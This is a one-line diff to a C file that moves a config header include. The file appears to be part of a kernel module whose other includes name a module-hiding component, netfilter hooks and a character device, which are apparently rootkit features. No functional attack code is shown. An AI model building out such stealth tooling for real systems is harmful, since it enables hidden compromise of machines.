@@ -1,5 +1,5 @@
 #include "core.h"
-#include "config.h"
+#include "config/config.h"
 #include "utils/hiders/hide_module.h"
 #include "net/netfilter.h"
 #include "chrdev/chrdev.h"
